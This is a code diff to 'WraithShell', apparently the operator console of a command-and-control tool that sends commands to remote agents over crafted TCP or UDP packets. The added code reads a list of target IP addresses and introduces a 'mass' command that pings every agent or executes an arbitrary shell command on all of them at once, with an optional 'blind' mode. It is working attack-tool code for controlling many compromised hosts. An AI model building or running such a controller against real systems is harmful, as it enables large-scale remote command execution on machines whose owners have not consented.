@@ -41,7 +41,26 @@ def send_packet_UDP(cmd, cmd_type, agent_ip, port):
 
     send(pkt, verbose=False)
 
+def parse_IP_file(file_path):
 
+    IP_list = []
+
+    try:
+
+        with open(file_path, "r") as file:
+            for line in file:
+                
+                # Skip comments
+                if line.strip()[0] == "#":
+                    continue 
+
+                IP_list.append(line.strip().replace(" ", ""))
+
+    except Exception as e:
+        print(f"Error: {e}")
+        
+    return IP_list
+    
 
 class WraithShell(cmd.Cmd):
 
@@ -53,6 +72,7 @@ class WraithShell(cmd.Cmd):
         self.current_protocol = "TCP"
         self.sender_wrapper = send_packet_TCP
         self.stop_listener = None
+        self.IP_list_path = None
         self._update_prompt()
 
     # Helper function to update the prompt when a target is set
@@ -107,9 +127,12 @@ class WraithShell(cmd.Cmd):
                     sys.stdout.write('\r\033[K') 
 
                     print(f"\n[+] Incoming response from {addr[0]}")
+                    print("==================================================")
                     print(message)
 
                     #sys.stdout.write(self.prompt)
+
+                    print("==================================================\n")
 
                     # Flush stdout
                     sys.stdout.flush()
@@ -235,6 +258,71 @@ class WraithShell(cmd.Cmd):
 
             case _:
                 print(self.do_listener.__doc__)
+
+    # Handle sending commands enmasse
+    def do_mass(self, arg):
+        """mass set [IP list path]\nmass ping\nmass exec [blind (optional)] [cmd]"""
+
+        args = arg.split()
+
+
+        if len(args) < 1:
+            print(self.do_mass.__doc__)
+
+
+        match args[0].strip().lower():
+
+            case "set":
+                self.IP_list_path = args[1].strip()
+                print(f"IP list file set to {self.IP_list_path}")
+
+
+            case "ping":
+
+                if not self.IP_list_path:
+                    print("IP list path not set")
+                    return
+
+                IP_list = parse_IP_file(self.IP_list_path)
+
+                if(len(IP_list) == 0):
+                    print("Error or empty IP list file")
+                    return
+
+                for IP in IP_list:
+                    self.sender_wrapper("ping", "CMD_PING", IP, self.target_port)
+
+            case "exec":
+
+                if not self.IP_list_path:
+                    print("IP list path not set")
+                    return
+
+                IP_list = parse_IP_file(self.IP_list_path)
+
+                if(len(IP_list) == 0):
+                    print("Error or empty IP list file")
+                    return
+
+                if args[1].strip().lower() == "blind":
+
+                    cmd = arg.split("blind", 1)[1].strip()
+
+                    print(f"Executing command '{cmd}' BLIND enmasse")
+
+                    for IP in IP_list:
+                        self.sender_wrapper(cmd, "CMD_EXEC_BLIND", IP, self.target_port)
+
+                else:
+
+                    cmd_args = arg.split("exec", 1)
+
+                    cmd = cmd_args[1].strip()
+
+                    print(f"Executing command '{cmd}' enmasse")
+
+                    for IP in IP_list:
+                        self.sender_wrapper(cmd, "CMD_EXEC", IP, self.target_port)
 
     # Handle protocol switching
     def do_protocol(self, arg):
